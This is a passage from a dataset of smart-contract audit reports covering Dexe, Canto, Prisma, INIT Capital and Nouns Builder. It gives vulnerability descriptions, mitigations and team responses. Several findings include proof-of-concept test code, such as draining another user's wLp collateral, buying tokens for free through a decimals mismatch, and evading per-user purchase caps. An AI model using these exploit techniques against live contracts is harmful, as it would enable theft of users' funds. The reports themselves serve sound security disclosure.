Then add a new line around [L528](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L528):
```javascript
      purchaseToken3 = await ERC20Mock.new(""PurchaseMockedToken3"", ""PMT3"", 6);
```

Then add a new tier around [L712](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L712):
```javascript
        {
          metadata: {
            name: ""tier 9"",
            description: ""the ninth tier"",
          },
          totalTokenProvided: wei(1000),
          saleStartTime: timeNow.toString(),
          saleEndTime: (timeNow + 10000).toString(),
          claimLockDuration: ""0"",
          saleTokenAddress: saleToken.address,
          purchaseTokenAddresses: [purchaseToken3.address],
          exchangeRates: [PRECISION.times(1).toFixed()],
          minAllocationPerUser: 0,
          maxAllocationPerUser: 0,
          vestingSettings: {
            vestingPercentage: ""0"",
            vestingDuration: ""0"",
            cliffPeriod: ""0"",
            unlockStep: ""0"",
          },
          participationDetails: [],
        },
```

Then add the test itself under the section `describe(""if added to whitelist"", () => {`:
```javascript
          it(""audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO"", async () => {
            await purchaseToken3.approve(tsp.address, wei(1000));

            // tier9 has the following parameters:
            // totalTokenProvided   : wei(1000)
            // minAllocationPerUser : 0 (no min)
            // maxAllocationPerUser : 0 (no max)
            // exchangeRate         : 1 sale token for every 1 purchaseToken
            //
            // purchaseToken3 has 6 decimal places
            //
            // mint purchase tokens to owner 1000 in 6 decimal places
            //                        1000 000000
            let buyerInitTokens6Dec = 1000000000;

            await purchaseToken3.mint(OWNER, buyerInitTokens6Dec);
            await purchaseToken3.approve(tsp.address, buyerInitTokens6Dec, { from: OWNER });

            //
            // start: buyer has bought no tokens
            let TIER9 = 9;
            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(0));

            // buyer attempts to purchase using 100 purchaseToken3 tokens
            // purchaseToken3 has 6 decimals but all inputs to Dexe should be in
            // 18 decimals, so buyer formats input amount to 18 decimals
            // doing this first to verify it works correctly
            let buyInput18Dec = wei(""100"");
            await tsp.buy(TIER9, purchaseToken3.address, buyInput18Dec);

            // buyer has bought wei(100) sale tokens
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, buyInput18Dec);

            // buyer has 900 000000 remaining purchaseToken3 tokens
            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), ""900000000"");

            // next buyer attempts to purchase using 100 purchaseToken3 tokens
            // but sends input formatted into native 6 decimals
            // sends 6 decimal input: 100 000000
            let buyInput6Dec = 100000000;
            await tsp.buy(TIER9, purchaseToken3.address, buyInput6Dec);

            // buyer has bought an additional 100000000 sale tokens
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, ""100000000000100000000"");

            // but the buyer still has 900 000000 remaining purchasetoken3 tokens
            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), ""900000000"");

            // by sending the input amount formatted to 6 decimal places,
            // the buyer was able to buy small amounts of the token being sold
            // for free!
          });
```

Finally run the test with: `npx hardhat test --grep ""audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO""`

**Recommended Mitigation:** There are at least 2 options for mitigating this issue:

Option 1 - revise the design decision that all token amounts must be sent in 18 decimals even if the underlying token decimals are not 18, to instead that all token amounts should be sent in their native decimals and Dexe will convert everything.

Option 2 - keep current design but revert if `amount.from18(token.decimals()) == 0` in [L90](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L90) or alternatively use the [`from18Safe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L124) function which uses [`_convertSafe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L248) that reverts if the conversion is 0.

The project team should also examine other areas where the same pattern occurs which may have the same vulnerability and where it may be required to revert if the conversion returns 0:

* `GovUserKeeper` [L92](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L92), [L116](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L116), [L183](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L183)
* `GovPool` [L248](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L248)
* `TokenSaleProposalWhitelist` [L50](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol#L50)
* `ERC721Power` [L113](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L113), [L139](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L139)
* `TokenBalance` [L35](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L35), [L62](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L62)

**Dexe:**
Fixed in commit [c700d9f](https://github.com/dexe-network/DeXe-Protocol/commit/c700d9f9f328d1df853891b52fd3527b56a6f1df).

**Cyfrin:** Verified. While other places have been changed, `TokenBalance::sendFunds()` still uses `from18()` instead of `from18Safe()` & other parts of the codebase which allow user input when calling `TokenBalance::sendFunds()` directly could be impacted by a similar issue.

For example `TokenSaleProposalWhitelist::unlockParticipationTokens()` - if users try to unlock a small enough amount of locked tokens which are in 6 decimal precision, state will be updated as if the unlock was successful but the resulting conversion in `TokenBalance::sendFunds()` will round down to 0. Execution will continue & zero tokens will be transferred to the user but since storage has been updated those tokens will remain forever locked.

Dexe should carefully consider if there exists any valid situations where the `from18()` conversion in `TokenBalance::sendFunds()` should round an input > 0 to 0, and the transaction should not revert but continue executing transferring 0 tokens? Cyfrin recommends that the ""default"" conversion to use is `from18Safe()` and that `from18()` should only be used where conversions to 0 are explicitly allowed.",Dexe,0kage|Dacian,HIGH,Wrong Math|Decimals|Precision Loss|ERC20|Weird ERC20,,0,3.0007154661394275,1.007154661394276,,https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md,,,solodit_reports,,2023-11-13 21:08:42,2024-10-15 00:53:11,1,"* @return the number brought from 18 to desired decimals of precision
```
                amountToLock.from18(tokenToLock.decimals())
```
            amount.from18(collateralToken.decimals())
```
            amount.from18(collateralToken.decimals())
```
            amount = amount.from18(ERC20(token).decimals());
```
        token.safeTransfer(receiver, amount.from18(address(token).decimals()));",Algo-Stables
1295013,d6f52f47b917b75a9fb81ce9cefdc321,Attacker can bypass token sale `maxAllocationPerUser` restriction to buy out the entire tier,Cyfrin,2023-11-10,"**Description:** An attacker can bypass the token sale `maxAllocationPerUser` restriction to buy out the entire tier by doing multiple small buys under this limit.

**Impact:** Permanent grief for other users who are unable to buy any of the exploited tier's tokens. Depending on the total supply a buyer could take control of the majority of the tokens by scooping them all up in a token sale, preventing them being distributed as intended and having monopoly control of the market. The `maxAllocationPerUser` restriction is not working as intended and can easily be bypassed by anyone.

**Proof of Concept:** First add Tier 8 to `test/gov/proposals/TokenSaleProposal.test.js` [L718](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L718):
```javascript
        {
          metadata: {
            name: ""tier 8"",
            description: ""the eighth tier"",
          },
          totalTokenProvided: wei(1000),
          saleStartTime: timeNow.toString(),
          saleEndTime: (timeNow + 10000).toString(),
          claimLockDuration: ""0"",
          saleTokenAddress: saleToken.address,
          purchaseTokenAddresses: [purchaseToken1.address],
          exchangeRates: [PRECISION.times(4).toFixed()],
          minAllocationPerUser: wei(10),
          maxAllocationPerUser: wei(100),
          vestingSettings: {
            vestingPercentage: ""0"",
            vestingDuration: ""0"",
            cliffPeriod: ""0"",
            unlockStep: ""0"",
          },
          participationDetails: [],
        },
```

Then add the PoC to the same file under the section `describe(""if added to whitelist"", () => {` around [L1995](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L1995):
```javascript
          it(""attacker can bypass token sale maxAllocationPerUser to buy out the entire tier"", async () => {
            await purchaseToken1.approve(tsp.address, wei(1000));

            // tier8 has the following parameters:
            // totalTokenProvided   : wei(1000)
            // minAllocationPerUser : wei(10)
            // maxAllocationPerUser : wei(100)
            // exchangeRate         : 4 sale tokens for every 1 purchaseToken
            //
            // one user should at most be able to buy wei(100),
            // or 10% of the total tier.
            //
            // any user can bypass this limit by doing multiple
            // smaller buys to buy the entire tier.
            //
            // start: user has bought no tokens
            let TIER8 = 8;
            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(0));

            // if the user tries to buy it all in one txn,
            // maxAllocationPerUser is enforced and the txn reverts
            await truffleAssert.reverts(tsp.buy(TIER8, purchaseToken1.address, wei(250)), ""TSP: wrong allocation"");

            // but user can do multiple smaller buys to get around the
            // maxAllocationPerUser check which only checks each
            // txn individually, doesn't factor in the total amount
            // user has already bought
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));

            // end: user has bought wei(1000) tokens - the entire tier!
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(1000));

            // attempting to buy more fails as the entire tier
            // has been bought by the single user
            await truffleAssert.reverts(
              tsp.buy(TIER8, purchaseToken1.address, wei(25)),
              ""TSP: insufficient sale token amount""
            );
          });
```

To run the PoC: `npx hardhat test --grep ""bypass token sale maxAllocationPerUser""`

**Recommended Mitigation:** `libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol` [L115-120](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L115-L120) should add the total amount already purchased by the user in the current tier to the current amount being purchased in the same tier, and ensure this total is `<= maxAllocationPerUser`.

**Dexe:**
Fixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-4cd963fe9cc6a9ca86a4c9a2dc8577b8c35f60690c9b9cbffca7a2b551dec99e).  We also changed how `exchageRate` works. So it was ""how many sale tokens per purchase token"", now it is ""how many purchase tokens per sale token"".

**Cyfrin:** Verified; changed our PoC exchange rate to 1:1.",Dexe,0kage|Dacian,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md,,,solodit_reports,,2023-11-13 21:08:42,2024-10-15 00:53:30,1,,Algo-Stables
1355079,040824663a5dec9e521d91d2ee7c924c,[H-01] Array Length of `tickTracking_ ` can be purposely increased to Brick Minting and Burning of most users' liquidity positions,Code4rena,2023-10-03,"### Lines of code

<https://github.com/code-423n4/2023-10-canto/blob/40edbe0c9558b478c84336aaad9b9626e5d99f34/canto_ambient/contracts/mixins/LiquidityMining.sol#L24-L35><br>
<https://github.com/code-423n4/2023-10-canto/blob/40edbe0c9558b478c84336aaad9b9626e5d99f34/canto_ambient/contracts/mixins/LiquidityMining.sol#L122>

### Impact

A malicious user can brick minting, burning and harvesting of liquidity for almost all liquidity providers.

*Important NOTE*: This is a different vector from another gas issue, which is iterating over too many ticks in `(int24 i = lowerTick + 10; i <= upperTick - 10; ++i)`. That issue affects wide liquidity positions, while this attack vector affects even liquidity positions with a relatively small number of ticks.

### Proof of Concept

When `accrueConcentratedPositionTimeWeightedLiquidity` is called, under most conditions for every potentially eligible tick, it will iterate over every `tickTrackingData` in `tickTracking`:

```solidity
while (time < block.timestamp && tickTrackingIndex < numTickTracking)
```

`tickTracking` is iterated by `tickTrackingIndex++;`

The array mapped by `tickTracking_` is increased by 1 for a tick every time a trade through the liquidity pool changes the price from a different tick to this tick. This is implemented in the `crossTicks` function:

```solidity
    function crossTicks(
        bytes32 poolIdx,
        int24 exitTick,
        int24 entryTick
    ) internal {
        uint256 numElementsExit = tickTracking_[poolIdx][exitTick].length;
        tickTracking_[poolIdx][exitTick][numElementsExit - 1]
            .exitTimestamp = uint32(block.timestamp);
        StorageLayout.TickTracking memory tickTrackingData = StorageLayout
            .TickTracking(uint32(block.timestamp), 0);
        tickTracking_[poolIdx][entryTick].push(tickTrackingData);
    }
```

A user could purposely increase the length of the `tickTracking_` array and cause the gas limit to be reached whenever the array is looped over.

The price impact required to cross a tick is from 0 to 1 bps, with 1 bps as the tick width. This is already extremely small, but the attacker could have the swap amount be a very small fraction of a bps if they first swap to make the price end very close to a tick boundary, then execute multiple extremely small swaps which bounce the price back and forth over the tick boundary.

Note that the CANTO liquidity rewards are targeted to stable pools. An attacker can be quite confident, for example, that a USDC/USDT pool will trade at around `$`1, and the ticks closest to `$`1 will always be eligible for rewards and therefore be looped over by all rewardable positions when `accrueConcentratedPositionTimeWeightedLiquidity` is called. Therefore, the attack can be targeted to just one or two ticks to affect almost every user.

`accrueConcentratedPositionTimeWeightedLiquidity` is called during minting, burning and harvesting liquidity positions. Therefore, this gas griefing attack will make all these functions revert for almost every user. This would basically break the functionality of concentrated liquidity pools on Ambient.

Contrast the effect to the cost to the attacker: using the aforementioned attack vector the main cost to the attacker will be the gas costs of performing the swaps. This is far lower than the damage that is done to the protocol/users.

One additional factor which makes this attack easy to execute, is that crossing ticks, even if the entry and exit is within the same `block.timestamp`, adds to the array length. Tracking this is unnecessary, because the tick was active for 0 blocks, and therefore, the time delta and allocated rewards is zero.

### Recommended Mitigation Steps

One immediate step would to `pop()` `tickTrackingData` as soon as the `exitTimestamp == entryTimestamp`. This happens to the last element of the array when `crossTicks` is called. Tracking this is unnecessary, because the tick was active for 0 blocks, and therefore, the time delta and allocated rewards is zero.

The documentation stated that CANTO rewards are meant to be distributed for stable pools for this codebase. The term ""stable"" could have different interpretations, but this recommendation assumes that this refers to stablecoin-like or pegged asset pairs such as stETH/WETH, USDT/USDC etc.

Instead of iterating through every tick, one could assume a range where the stable assets could lie and then reward all positions that lie within the specified range; in this case, +/- 10 ticks of the price tick.

This makes an assumption that these ""stable assets"" will actually stay pegged to each other. However, the current accounting architecture has multiple problems:

- Given the high number of loops required by the current accounting mechanism, there are multiple reasons that gas could run out. This includes iterating through too many ticks or having too many tick entries/exits.

- The current mechanism increases the gas costs of all minting, burning and harvesting.

- DOS attacks like the one described in this issue are possible.

Assuming a stable price has the downside of misallocating rewards if the stable assets depeg from each other. However, this may be a reasonable tradeoff to prevent this DOS attack.

### Assessed type

DoS

**[OpenCoreCH (Canto) confirmed](https://github.com/code-423n4/2023-10-canto-findings/issues/114#issuecomment-1757196983)**

*Note: for full discussion, see [here](https://github.com/code-423n4/2023-10-canto-findings/issues/114)*.

***",Canto,adriro|twicek|0xWaitress|3docSec|0xDING99YA|Banditx0x|0xpiken|maanas|emerald7017,HIGH,,24500,0,0,0,https://github.com/code-423n4/2023-10-canto-findings/issues/114,https://code4rena.com/reports/2023-10-canto,,https://code4rena.com/reports/2023-10-canto,solodit_reports,57fc192c99513a403a1d42da9bcff1ab,2023-11-23 21:08:37,2024-10-15 00:34:25,1,"function crossTicks(
        bytes32 poolIdx,
        int24 exitTick,
        int24 entryTick
    ) internal {
        uint256 numElementsExit = tickTracking_[poolIdx][exitTick].length;
        tickTracking_[poolIdx][exitTick][numElementsExit - 1]
            .exitTimestamp = uint32(block.timestamp);
        StorageLayout.TickTracking memory tickTrackingData = StorageLayout
            .TickTracking(uint32(block.timestamp), 0);
        tickTracking_[poolIdx][entryTick].push(tickTrackingData);
    }
```
                                tickTrackingIndex++;",Dexes|CDP|Yield|Services|Cross Chain
1355352,fd34f7838647d1e81212e96058303941,Small amounts can be withdrawn without penalties from TockenLocker,MixBytes,2023-09-01,"##### Description
- https://github.com/prisma-fi/prisma-contracts/blob/c0122d27677cd4e1aaee7f1e21f807ccadf46ac8/contracts/dao/TokenLocker.sol#L806

There's a rounding error in the penalty calculation:
```
uint256 penaltyOnAmount = (lockAmount * weeksToUnlock) / MAX_LOCK_WEEKS;
```

The penalty becomes zero if `lockAmount * weeksToUnlock < MAX_LOCK_WEEKS`. For example, if `lockToTokenRatio=1e18`, then 1e18 PRISM is locked for 51 weeks (or alternatively, 51e18 PRISMA is locked for 1 week) can be withdrawn without penalties.

One example of an attack that allows you to withdraw 23% of the tokens from the `AllocationVesting` contract:
- We send a small amount of tokens using `allocation_vesting.transferPoints` to any of the addresses (https://github.com/prisma-fi/pris`ma-contracts/blob/c0122d27677cd4e1aaee7f1e21f807ccadf46ac8/contracts/dao/AllocationVesting.sol#L83)
- Lock these tokens `allocation_vesting.lockFutureClaims` releasing 23% of future transfers (https://github.com/prisma-fi/prisma-contracts/blob/c0122d27677cd4e1aaee7f1e21f807ccadf46ac8/contracts/dao/AllocationVesting.sol#L116)
- Call `locker.withdrawWithPenalty` in a loop (https://github.com/prisma-fi/prisma-contracts/blob/c0122d27677cd4e1aaee7f1e21f807ccadf46ac8/contracts/dao/TokenLocker.sol#L769). In this case, the commission is not taken
- Get PRISMA tokens without blocking for 12 weeks

PoC has been sent to the customer.

##### Recommendation

We recommended that you improve the precision of the penalty calculation or prohibit the early withdrawal of small amounts.",Prisma Finance,MixBytes,HIGH,,,0,0,0,,https://github.com/mixbytes/audits_public/blob/master/Prisma%20Finance/README.md#3-small-amounts-can-be-withdrawn-without-penalties-from-tockenlocker,,,solodit_reports,,2023-11-30 21:09:12,2024-10-15 00:25:32,1,"function lockFutureClaimsWithReceiver(address account, address receiver) public callerOrDelegated(account) {
```
    function withdrawWithPenalty(uint256 amountToWithdraw) external notFrozen(msg.sender) returns (uint256) {",
1355615,d28fbb1b3e53c003a77a14087d97cb2b,[H-02] wLp tokens could be stolen,Code4rena,2023-12-15,"`PosManager#removeCollateralWLpTo` function allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol:

```solidity
File: PosManager.sol
249:     function removeCollateralWLpTo(uint _posId, address _wLp, uint _tokenId, uint _amt, address _receiver)
250:         external
251:         onlyCore
252:         returns (uint)
253:     {
254:         PosCollInfo storage posCollInfo = __posCollInfos[_posId];
255:         // NOTE: balanceOfLp should be 1:1 with amt
256:         uint newWLpAmt = IBaseWrapLp(_wLp).balanceOfLp(_tokenId) - _amt;
257:         if (newWLpAmt == 0) { 
258:             _require(posCollInfo.ids[_wLp].remove(_tokenId), Errors.NOT_CONTAIN);
259:             posCollInfo.collCount -= 1;
260:             if (posCollInfo.ids[_wLp].length() == 0) {
261:                 posCollInfo.wLps.remove(_wLp);
262:             }
263:             isCollateralized[_wLp][_tokenId] = false;
264:         }
265:         _harvest(_posId, _wLp, _tokenId);
266:         IBaseWrapLp(_wLp).unwrap(_tokenId, _amt, _receiver);
267:         return _amt;
268:     }
```

This function could be called only from the core contract using the `decollateralizeWLp` and `liquidateWLp` functions. However, it fails to check if the specified `tokenId` belongs to the current position, this check would take place only if removing is full - meaning no lp tokens remain wrapped in the wLp (line 257).

This would allow anyone to drain any other positions with supplied wLp tokens. The attacker only needs to create its own position, supply dust amount in wLp to it, and call `decollateralizeWLp` with the desired 'tokenId', also withdrawn amount should be less than the full wLp balance to prevent check on line 257. An attacker would receive almost all lp tokens and accrued rewards from the victim's wLp.

A similar attack for harvesting the victim's rewards could be done through the `liquidateWLp` function.

### Impact

Attacker could drain any wLp token and harvest all accrued rewards for this token.

### Proof of Concept

The next test added to the `tests/wrapper/TestWLp.sol` file could show an exploit scenario:

```solidity
    function testExploitStealWlp() public {
        uint victimAmt = 100000000;
        // Bob open position with 'tokenId' 1
        uint bobPosId = _openPositionWithLp(BOB, victimAmt);
        // Alice open position with 'tokenId' 2 and dust amount 
        uint alicePosId = _openPositionWithLp(ALICE, 1);
        // Alice successfully de-collateralizes her own position using Bob's 'tokenId' and amounts less than Bob's position by 1 to prevent a revert
        vm.startPrank(ALICE, ALICE);
        initCore.decollateralizeWLp(alicePosId, address(mockWLpUniV2), 1, victimAmt - 1, ALICE);
        vm.stopPrank();

        emit log_uint(positionManager.getCollWLpAmt(bobPosId, address(mockWLpUniV2), 1));
        emit log_uint(IERC20(lp).balanceOf(ALICE));
    }

```

### Recommended Mitigation Steps

Consider adding a check that position holds the specified token into the `removeCollateralWLpTo` function:

```solidity
_require(__posCollInfos[_posId].ids[_wlp].contains(_tokenId), Errors.NOT_CONTAIN);
```

**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/31#issuecomment-1870313456)**

***",INIT Capital,said|sashik\_eth,HIGH,,38500,0,0,0,https://github.com/code-423n4/2023-12-initcapital-findings/issues/31,https://code4rena.com/reports/2023-12-initcapital,,https://code4rena.com/reports/2023-12-initcapital,solodit_reports,1fade7485882475ae1c7ebef0c1c58ed,2024-01-18 21:10:08,2024-10-15 00:59:54,1,,Lending
1385555,fd3b8552b5a5ad41b6ff2d9109e9f46e,H-1: when reservedUntilTokenId > 100 first funder loss 1% NFT,Sherlock,2023-12-01,"# Issue H-1: when reservedUntilTokenId > 100 first funder loss 1% NFT 

Source: https://github.com/sherlock-audit/2023-09-nounsbuilder-judging/issues/42 

## Found by 
0x52, 0xReiAyanami, 0xbepresent, 0xcrunch, 0xmystery, 0xpep7, Aamirusmani1552, Ch\_301, Falconhoof, HHK, Jiamin, Juntao, KingNFT, Kow, Krace, KupiaSec, Nyx, SilentDefendersOfDeFi, SovaSlava, almurhasan, ast3ros, bin2chen, cawfree, chaduke, circlelooper, coffiasd, dany.armstrong90, deepkin, dimulski, ge6a, ggg\_ttt\_hhh, giraffe, gqrp, pontifex, qpzm, rvierdiiev, saian, unforgiven, whoismxuse, xAriextz, ydlee, zraxx
## Summary
The incorrect use of `baseTokenId = reservedUntilTokenId` may result in the first `tokenRecipient[]` being invalid, thus preventing the founder from obtaining this portion of the NFT.

## Vulnerability Detail

The current protocol adds a parameter `reservedUntilTokenId` for reserving `Token`.
This parameter will be used as the starting `baseTokenId` during initialization.

```solidity
    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {
...

                // Used to store the base token id the founder will recieve
@>              uint256 baseTokenId = reservedUntilTokenId;

                // For each token to vest:
                for (uint256 j; j < founderPct; ++j) {
                    // Get the available token id
                    baseTokenId = _getNextTokenId(baseTokenId);

                    // Store the founder as the recipient
                    tokenRecipient[baseTokenId] = newFounder;

                    emit MintScheduled(baseTokenId, founderId, newFounder);

                    // Update the base token id
                    baseTokenId = (baseTokenId + schedule) % 100;
                }
            }
..

    function _getNextTokenId(uint256 _tokenId) internal view returns (uint256) {
        unchecked {
@>          while (tokenRecipient[_tokenId].wallet != address(0)) {
                _tokenId = (++_tokenId) % 100;
            }

            return _tokenId;
        }
    }
```

Because `baseTokenId = reservedUntilTokenId` is used, if `reservedUntilTokenId>100`, for example, reservedUntilTokenId=200, the first `_getNextTokenId(200)` will return `baseTokenId=200 ,  tokenRecipient[200]=newFounder`.

Example:
reservedUntilTokenId = 200
founder[0].founderPct = 10

In this way, the `tokenRecipient[]` of `founder` will become
tokenRecipient[200].wallet = founder   ( first will call _getNextTokenId(200) return 200)
tokenRecipient[10].wallet = founder      ( second will call _getNextTokenId((200 + 10) %100 = 10) )
tokenRecipient[20].wallet = founder
...
tokenRecipient[90].wallet = founder


However, this `tokenRecipient[200]` will never be used, because in `_isForFounder()`, it will be modulo, so only `baseTokenId < 100` is valid. In this way, the first founder can actually only `9%` of NFT.

```solidity
    function _isForFounder(uint256 _tokenId) private returns (bool) {
        // Get the base token id
@>      uint256 baseTokenId = _tokenId % 100;

        // If there is no scheduled recipient:
        if (tokenRecipient[baseTokenId].wallet == address(0)) {
            return false;

            // Else if the founder is still vesting:
        } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) {
            // Mint the token to the founder
@>          _mint(tokenRecipient[baseTokenId].wallet, _tokenId);

            return true;

            // Else the founder has finished vesting:
        } else {
            // Remove them from future lookups
            delete tokenRecipient[baseTokenId];

            return false;
        }
    }
```

## POC

The following test demonstrates that `tokenRecipient[200]` is for founder.

1. need change tokenRecipient to public , so can assertEq
```diff
contract TokenStorageV1 is TokenTypesV1 {
    /// @notice The token settings
    Settings internal settings;

    /// @notice The vesting details of a founder
    /// @dev Founder id => Founder
    mapping(uint256 => Founder) internal founder;

    /// @notice The recipient of a token
    /// @dev ERC-721 token id => Founder
-   mapping(uint256 => Founder) internal tokenRecipient;
+   mapping(uint256 => Founder) public tokenRecipient;
}
```

2. add to `token.t.sol`
```solidity
    function test_lossFirst(address _minter, uint256 _reservedUntilTokenId, uint256 _tokenId) public {
        deployAltMock(200);
        (address wallet ,,)= token.tokenRecipient(200);
        assertEq(wallet,founder);
    }
```

```console
$ forge test -vvv --match-test test_lossFirst

Running 1 test for test/Token.t.sol:TokenTest
[PASS] test_lossFirst(address,uint256,uint256) (runs: 256, μ: 3221578, ~: 3221578)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 355.45ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

## Impact

when reservedUntilTokenId > 100 first funder loss 1% NFT

## Code Snippet

https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L161

## Tool used

Manual Review

## Recommendation
1. A better is that the baseTokenId always starts from 0.
```diff
    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {
...

                // Used to store the base token id the founder will recieve
-               uint256 baseTokenId = reservedUntilTokenId;
+               uint256 baseTokenId =0;
```
or

2. use `uint256 baseTokenId = reservedUntilTokenId  % 100;`
```diff
    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {
...

                // Used to store the base token id the founder will recieve
-               uint256 baseTokenId = reservedUntilTokenId;
+               uint256 baseTokenId = reservedUntilTokenId  % 100;
```



## Discussion

**neokry**

This is valid and is the core issue behind #247 as well. baseTokenId should start at 0 in `addFounders`

**nevillehuang**

I initially separated the 4 findings below, but I agree, #177, #247 and #67 are only possible because of the following lines of code [here](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L161), wherein `_addFounder()`, `baseTokenId` is incorrectly initialized to `reservedUntilTokenId ` in `addFounders()`, which is the root cause of the issue, and once fixed, all the issues will be fixed too. There are 4 impacts mentioned by watsons. 

```solidity
uint256 baseTokenId = reservedUntilTokenId;
```

1. Previous founders that are meant to be deleted are retained causing them to continue receiving minted NFTs --> High severity, since it is a definite loss of funds

2. #247: Any `reserveTokenId` greater than 100 will cause a 1% loss of NFT for founder --> High severity, since it is a definite loss of funds for founder as long as `reservedUntilTokenId ` is set greater than 100, which is not unlikely

3. #177: This is essentially only an issue as `baseTokenId` is incorrectly set as `reservedUntilTokenId` but will cause a definite loss of founders NFT if performed, so keeping as duplicate

4. #67: This is closely related to the above finding (177), where a new update to `reservedUntilTokenId` via `setReservedUntilTokenId` can cause over/underallocation NFTs so keeping as duplicate


However, in the context of the audit period, I could also see why watsons separated these issues, so happy to hear from watsons during escalation period revolving deduplication of these issues.

**neokry**

Fixed here: https://github.com/ourzora/nouns-protocol/pull/122

**nevillehuang**

Hi @neokry would be helpful if you could highlight to watsons here why you think the following primary issues should be duplicated under this issue:

#67
#177
#247 

From my understanding it stems from the `_addFounders()` function used in both the `initialize()` and `updateFounders()` function, in particular the following line [here](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/token/Token.sol#L161), 
```solidity
uint256 baseTokenId = reservedUntilTokenId;
```

But it would be extremely helpful if you could provide a more detailed explanation in each finding, and show how the fix to #42 also fixes the rest of the findings.

To all watsons, this is my initial deduplication [here](https://discord.com/channels/812037309376495636/1176899915411099719/1184507360765546556), feel free to also provide me the flow state of the functions to prove that they do not have the same root cause.

**nevillehuang**

Hi watsons, 
The core of issue #42 is that `baseTokenId` should not start with `reservedUntilTokenId ` within `addFounders()`

#67 and its duplicates
I believe this issue and its duplicates are invalid as there is a misunderstanding of how founders token amount are assigned based on this [comment here](https://github.com/sherlock-audit/2023-09-nounsbuilder-judging/issues/67#issuecomment-1856255695)

Both #177 and #247 and its duplicates
